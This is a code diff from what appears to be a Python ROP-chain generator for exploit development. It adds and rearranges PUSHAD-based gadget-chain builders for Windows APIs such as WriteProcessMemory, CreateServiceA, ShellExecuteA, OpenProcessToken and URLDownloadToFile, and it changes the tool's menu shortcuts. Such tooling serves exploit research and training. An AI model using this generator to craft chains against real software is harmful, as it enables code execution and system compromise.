+		foundInnerWPM,outputsTxtWPM, outputsTxtCWPM,outputsPkWPM=buildPushadInner(bad,excludeRegs2,"WriteProcessMemory",1,"apiCode",pk,pk,stopCode)
+		if foundInnerWPM:
+			printGadgetChain(outputsTxtWPM, "WriteProcessMemory")
+
+	# GPAWriteProcessMemory
+	# elif patType=="WriteProcessMemory":
+	# 	stopCode="WPM"
+	# 	foundInner1,oldApiCode, pk1,pkPA1=buildPushadInner(bad,excludeRegs2,"LoadLibrary",9,"apiCode",pk,pk,stopCode)
+	# 	if foundInner1:
+	# 		oldPat+=oldApiCode + " "
+	# 		foundInner2, oldApiCode,pk2,pkPA2=buildPushadInner(bad,excludeRegs2,"GetProcAddress",11,"apiCode",pk1,pkBuild([pkPA1]),stopCode)
+	# 		if foundInner2:
+	# 			oldPat+=oldApiCode + " "
+	# 			pkTemp=pkBuild([pk1,pk2])
+	# 			pk=pkBuild([pkPA1,pkPA2])
+	# 			foundInnerWPM,outputsTxtWPM,outputsTxtCWPM, outputsPkWPM=buildPushadInner(bad,excludeRegs2,"WriteProcessMemory",1,"apiCode",pkTemp,pkBuild([pkPA1,pkPA2]),stopCode)
+	# 			if foundInnerWPM:
+	# 				printGadgetChain(outputsTxtWPM, "WriteProcessMemory")
+
+	elif patType == "OpenSCManagerA":
+		stopCode="OSCM"
+		foundInnerOSCM,outputsTxtOSCM, outputsTxtCOSCM,outputsPkOSCM=buildPushadInner(bad,excludeRegs2,"OpenSCManagerA",1,"apiCode",pk,pk,stopCode)
+		if foundInnerOSCM:
+			printGadgetChain(outputsTxtOSCM, "OpenSCManagerA")
+
+	# GPAOpenSCManagerA
+	# elif patType=="OpenSCManagerA":
+	# 	stopCode="OSCM"
+	# 	foundInner1,oldApiCode, pk1,pkPA1=buildPushadInner(bad,excludeRegs2,"LoadLibrary",9,"apiCode",pk,pk,stopCode)
+	# 	if foundInner1:
+	# 		oldPat+=oldApiCode + " "
+	# 		foundInner2, oldApiCode,pk2,pkPA2=buildPushadInner(bad,excludeRegs2,"GetProcAddress",11,"apiCode",pk1,pkBuild([pkPA1]),stopCode)
+	# 		if foundInner2:
+	# 			oldPat+=oldApiCode + " "
+	# 			pkTemp=pkBuild([pk1,pk2])
+	# 			pk=pkBuild([pkPA1,pkPA2])
+	# 			foundInnerOSCM,outputsTxtOSCM,outputsTxtCOSCM, outputsPkOSCM=buildPushadInner(bad,excludeRegs2,"OpenSCManagerA",1,"apiCode",pkTemp,pkBuild([pkPA1,pkPA2]),stopCode)
+	# 			if foundInnerOSCM:
+	# 				printGadgetChain(outputsTxtOSCM, "OpenSCManagerA")
+
+	elif patType == "CreateServiceA":
+		stopCode="CSA"
+		foundInnerCSA,outputsTxtCSA, outputsTxtCCSA,outputsPkCSA=buildPushadInner(bad,excludeRegs2,"CreateServiceA",1,"apiCode",pk,pk,stopCode)
+		if foundInnerCSA:
+			printGadgetChain(outputsTxtCSA, "CreateServiceA")
+
+	elif patType=="ExCreateServiceA":
+		stopCode="CSA"
+		foundInner1,oldApiCode, pk1,pkPA1=buildPushadInner(bad,excludeRegs2,"LoadLibrary",9,"apiCode",pk,pk,stopCode)
+		if foundInner1:
+			oldPat+=oldApiCode + " "
+			foundInner2, oldApiCode,pk2,pkPA2=buildPushadInner(bad,excludeRegs2,"GetProcAddress",11,"apiCode",pk1,pkBuild([pkPA1]),stopCode)
+			if foundInner2:
+				oldPat+=oldApiCode + " "
+				pkTemp=pkBuild([pk1,pk2])
+				pk=pkBuild([pkPA1,pkPA2])
+				foundInner3, oldApiCode, pk3, pkPA3 = buildPushadInner(bad, excludeRegs2, "OpenSCManagerA", 1, "apiCode", pkTemp, pkBuild([pkPA1, pkPA2]), stopCode)
+				if foundInner3:
+					oldPat += oldApiCode + " "
+					pkTemp2 = pkBuild([pk1, pk2, pk3])
+					foundInner4, oldApiCode, pk4, pkPA4 = buildPushadInner(bad, excludeRegs2, "LoadLibrary", 9, "apiCode", pkTemp2, pkBuild([pkPA1, pkPA2, pkPA3]), stopCode)
+					if foundInner4:
+						oldPat += oldApiCode + " "
+						pkTemp3 = pkBuild([pk1, pk2, pk3, pk4])
+						foundInner5, oldApiCode, pk5, pkPA5 = buildPushadInner(bad, excludeRegs2, "GetProcAddress", 11, "apiCode", pkTemp3, pkBuild([pkPA1, pkPA2, pkPA3, pkPA4]), stopCode)
+						if foundInner5:
+							foundInnerExCSA, outputsTxtExCSA, outputsTxtCExCSA, outputsPkExCSA = buildPushadInner(bad, excludeRegs2, "CreateServiceA", 1, "apiCode", pkTemp2, pkBuild([pkPA1, pkPA2, pkPA3, pkPA4, pkPA5]), stopCode)
+							if foundInnerExCSA:
+								printGadgetChain(outputsTxtExCSA, "ExCreateServiceA")
+
+	elif patType == "ShellExecuteA":
+		stopCode="SEA"
+		foundInnerSEA,outputsTxtSEA, outputsTxtCSEA,outputsPkSEA=buildPushadInner(bad,excludeRegs2,"ShellExecuteA",1,"apiCode",pk,pk,stopCode)
+		if foundInnerSEA:
+			printGadgetChain(outputsTxtSEA, "ShellExecuteA")
+
+	# GPAShellExecuteA
+	# elif patType=="ShellExecuteA":
+	# 	stopCode="SEA"
+	# 	foundInner1,oldApiCode, pk1,pkPA1=buildPushadInner(bad,excludeRegs2,"LoadLibrary",9,"apiCode",pk,pk,stopCode)
+	# 	if foundInner1:
+	# 		oldPat+=oldApiCode + " "
+	# 		foundInner2, oldApiCode,pk2,pkPA2=buildPushadInner(bad,excludeRegs2,"GetProcAddress",11,"apiCode",pk1,pkBuild([pkPA1]),stopCode)
+	# 		if foundInner2:
+	# 			oldPat+=oldApiCode + " "
+	# 			pkTemp=pkBuild([pk1,pk2])
+	# 			pk=pkBuild([pkPA1,pkPA2])
+	# 			foundInnerSEA,outputsTxtSEA,outputsTxtCSEA, outputsPkSEA=buildPushadInner(bad,excludeRegs2,"ShellExecuteA",1,"apiCode",pkTemp,pkBuild([pkPA1,pkPA2]),stopCode)
+	# 			if foundInnerSEA:
+	# 				printGadgetChain(outputsTxtSEA, "ShellExecuteA")
+
 	elif patType=="HG32":
 		stopCode="HG32"
 		foundInnerHG,outputsTxtHG, outputsTxtCHG,outputsPkHG=buildPushadInner(bad,excludeRegs2,"HG",11,"apiCode",pk,pk,stopCode)
@@ -13974,16 +14422,6 @@ def buildPushad(bad, patType):
 			# fgc.addHg32to64(fChainObj(outputsPkHG,outputsTxtHG,outputsTxtCHG))
 			#todo
 			printGadgetChain(outputsTxtVP, "VirtualAlloc")
-	elif patType=="WE":
-		stopCode="WE"
-		foundInnerWE,outputsTxtWE, outputsTxtCWE,outputsPkWE=buildPushadInner(bad,excludeRegs2,"WE",10,"apiCode",pk,pk,stopCode)
-		if foundInnerWE:
-			printGadgetChain(outputsTxtWE, "WinExec")
-	elif patType=="DF":
-		stopCode="DF"
-		foundInnerWE,outputsTxtWE, outputsTxtCWE,outputsPkWE=buildPushadInner(bad,excludeRegs2,"DF",17,"apiCode",pk,pk,stopCode)
-		if foundInnerWE:
-			printGadgetChain(outputsTxtWE, "DeleteFileA")
 
 	elif patType == "CT32S":
 		stopCode="CT32S"
@@ -14027,36 +14465,6 @@ def buildPushad(bad, patType):
 		if foundInnerRC:
 			printGadgetChain(outputsTxtRC, "RegCreateKeyA")
 
-	elif patType == "WriteProcessMemory":
-		stopCode="WPM"
-		foundInnerWPM,outputsTxtWPM, outputsTxtCWPM,outputsPkWPM=buildPushadInner(bad,excludeRegs2,"WriteProcessMemory",1,"apiCode",pk,pk,stopCode)
-		if foundInnerWPM:
-			printGadgetChain(outputsTxtWPM, "WriteProcessMemory")
-
-	elif patType == "HeapCreate":
-		stopCode="HC"
-		foundInnerHC,outputsTxtHC, outputsTxtCHC,outputsPkHC=buildPushadInner(bad,excludeRegs2,"HeapCreate",1,"apiCode",pk,pk,stopCode)
-		if foundInnerHC:
-			printGadgetChain(outputsTxtHC, "HeapCreate")
-
-	elif patType == "OpenSCManagerA":
-		stopCode="OSCM"
-		foundInnerOSCM,outputsTxtOSCM, outputsTxtCOSCM,outputsPkOSCM=buildPushadInner(bad,excludeRegs2,"OpenSCManagerA",1,"apiCode",pk,pk,stopCode)
-		if foundInnerOSCM:
-			printGadgetChain(outputsTxtOSCM, "OpenSCManagerA")
-
-	elif patType == "CreateServiceA":
-		stopCode="CSA"
-		foundInnerCSA,outputsTxtCSA, outputsTxtCCSA,outputsPkCSA=buildPushadInner(bad,excludeRegs2,"CreateServiceA",1,"apiCode",pk,pk,stopCode)
-		if foundInnerCSA:
-			printGadgetChain(outputsTxtCSA, "CreateServiceA")
-
-	elif patType == "ShellExecuteA":
-		stopCode="SEA"
-		foundInnerSEA,outputsTxtSEA, outputsTxtCSEA,outputsPkSEA=buildPushadInner(bad,excludeRegs2,"ShellExecuteA",1,"apiCode",pk,pk,stopCode)
-		if foundInnerSEA:
-			printGadgetChain(outputsTxtSEA, "ShellExecuteA")
-
 	elif patType == "CreateRemoteThread":
 		stopCode="CRT"
 		foundInnerCRT,outputsTxtCRT, outputsTxtCCRT,outputsPkCRT=buildPushadInner(bad,excludeRegs2,"CreateRemoteThread",1,"apiCode",pk,pk,stopCode)
@@ -14080,6 +14488,12 @@ def buildPushad(bad, patType):
 		foundInnerCPA,outputsTxtCPA, outputsTxtCCPA,outputsPkCPA=buildPushadInner(bad,excludeRegs2,"CreateProcessA",1,"apiCode",pk,pk,stopCode)
 		if foundInnerCPA:
 			printGadgetChain(outputsTxtCPA, "CreateProcessA")
+
+	elif patType == "OpenProcessToken":
+		stopCode="OPT"
+		foundInnerOPT,outputsTxtOPT, outputsTxtCOPT,outputsPkOPT=buildPushadInner(bad,excludeRegs2,"OpenProcessToken",1,"apiCode",pk,pk,stopCode)
+		if foundInnerOPT:
+			printGadgetChain(outputsTxtOPT, "OpenProcessToken")
 
 	elif patType == "Test":
 		stopCode="Test"
@@ -16757,6 +17171,13 @@ def genOpenProcess():
 	timeStop = timeit.default_timer()
 	print(red, " Time:", yel, str(timeStop - timeStart), res)
 
+def genOpenProcessToken():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "OpenProcessToken")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
+
 def genProcess32First():
 	timeStart = timeit.default_timer()
 	global bad
@@ -16813,6 +17234,13 @@ def genCreateServiceA():
 	timeStop = timeit.default_timer()
 	print(red, " Time:", yel, str(timeStop - timeStart), res)
 
+def genExCreateServiceA():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "ExCreateServiceA")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
+
 def genShellExecuteA():
 	timeStart = timeit.default_timer()
 	global bad
@@ -16845,6 +17273,13 @@ def genCreateProcessA():
 	timeStart = timeit.default_timer()
 	global bad
 	buildPushad(bad, "CreateProcessA")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
+
+def genHeapAlloc():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "HeapAlloc")
 	timeStop = timeit.default_timer()
 	print(red, " Time:", yel, str(timeStop - timeStart), res)
 
@@ -18217,12 +18652,69 @@ def ui():
 			elif userIN[0:1] == "i":
 				# giveInput()
 				pass
-			elif userIN[0:1] == "R":
-				getGadgetsx6486()
-
+					
+			elif userIN[0:1] == "!":
+				genVirtualProtectPushad()
+			elif userIN[0:2] == "df":
+				genDeleteFileAPushad()
+			elif userIN[0:1] == "@":
+				genVirtualAllocPushad()
+			elif userIN[0:2] == "we":
+				genWinExecPushad()
+			
+			elif userIN[0:2] == "ct":
+				genCreateToolhelp32SnapshotROP()
+			elif userIN[0:1] == "u" or userIN[0:1] == "U":
+				genURLDownloadToFile()
+			elif userIN[0:2] == "op":
+				genOpenProcess()
+			elif userIN[0:2] == "pf":
+				genProcess32First()
+			elif userIN[0:2] == "pn":
+				genProcess32Next()
+			elif userIN[0:2] == "rs":
+				genRegSetKeyValueA()
+			elif userIN[0:2] == "rc":
+				genRegCreateKeyA()
+			elif userIN[0:2] == "wp":
+				genWriteProcessMemory()
+			elif userIN[0:2] == "hc":
+				genHeapCreate()
+			elif userIN[0:2] == "os":
+				genOpenSCManagerA()
+			elif userIN[0:2] == "cs":
+				genCreateServiceA()
+			elif userIN[0:3] == "ecs":
+				genExCreateServiceA()
+			elif userIN[0:2] == "se":
+				genShellExecuteA()
+			elif userIN[0:2] == "cr":
+				genCreateRemoteThread()
+			elif userIN[0:2] == "va":
+				genVirtualAllocEx()
+			elif userIN[0:2] == "tp":
+				genTerminateProcess()
+			elif userIN[0:2] == "cp":
+				genCreateProcessA()
+			elif userIN[0:2] == "22":
+				genTest()
+			elif userIN[0:1] == "o":
+				genObfs()
+			elif userIN[0:1] == "p":
+				printGadgets()
+			elif userIN[0:1] == "w":
+				findGadget()		
 			elif userIN[0:1] == "g":
 				genHeavanGatex32()
 				pass
+			elif userIN[0:1] == "b":
+				getBadBytesSubmenu()
+			elif userIN[0:1] == "d":
+				genShellcodelessROP_GetProc()
+			elif userIN[0:1] == "r":
+				getGadgetsSubMenu()
+			elif userIN[0:1] == "R":
+				getGadgetsx6486()
 			elif userIN[0:1] == "t":	
 				genHeavanGatex64()
 				pass
@@ -18234,62 +18726,7 @@ def ui():
 			elif userIN[0:1] == "s":
 				genShellcodelessROP_System()
 			elif userIN[0:1] == "m":
-
-				genMovDerefVP()
-			elif userIN[0:1] == "!":
-				genVirtualProtectPushad()
-			elif userIN[0:1] == "$":
-				genDeleteFileAPushad()
-			elif userIN[0:1] == "@":
-				genVirtualAllocPushad()
-			elif userIN[0:1] == "#":
-				genWinExecPushad()
-			elif userIN[0:1] == "b":
-				getBadBytesSubmenu()
-			elif userIN[0:1] == "d":
-				genShellcodelessROP_GetProc()
-			elif userIN[0:1] == "k":
-				genCreateToolhelp32SnapshotROP()
-			elif userIN[0:1] == "u":
-				genURLDownloadToFile()
-			elif userIN[0:1] == "l":
-				genOpenProcess()
-			elif userIN[0:2] == "pf":
-				genProcess32First()
-			elif userIN[0:2] == "pn":
-				genProcess32Next()
-			elif userIN[0:2] == "rs":
-				genRegSetKeyValueA()
-			elif userIN[0:2] == "rc":
-				genRegCreateKeyA()
-			elif userIN[0:1] == "r":
-				getGadgetsSubMenu()
-			elif userIN[0:2] == "33":
-				genWriteProcessMemory()
-			elif userIN[0:2] == "44":
-				genHeapCreate()
-			elif userIN[0:2] == "55":
-				genOpenSCManagerA()
-			elif userIN[0:2] == "cs":
-				genCreateServiceA()
-			elif userIN[0:2] == "77":
-				genShellExecuteA()
-			elif userIN[0:2] == "88":
-				genCreateRemoteThread()
-			elif userIN[0:2] == "99":
-				genVirtualAllocEx()
-			elif userIN[0:2] == "11":
-				genTerminateProcess()
-			elif userIN[0:2] == "cp":
-				genCreateProcessA()
-			elif userIN[0:2] == "22":
-				genTest()
-			elif userIN[0:1] == "o":
-				genObfs()
-			elif userIN[0:1] == "p":
-				printGadgets()
-			elif userIN[0:1] == "w":
-				findGadget()				
+				genMovDerefVP()		
 			elif userIN[0:1] == "P":
 				if opt["bx86Print"] and opt["bx86Extracted"]:
 					print ("  Printing x86 gadgets...")
@@ -18303,8 +18740,8 @@ def ui():
 				con = Configuration(conFile)
 				modConf()
 				saveConf(con)
-			elif userIN[0:1] == "U" or userIN[0:1] == "u":				  
-				pass
+
+			# keyword "a" is already being used. change the keyword before making changes
 			elif userIN[0:1] == "a":	# "change architecture, 32-bit or 64-bit"
 				# dp("\nReturning to main menu.\n")
 				pass
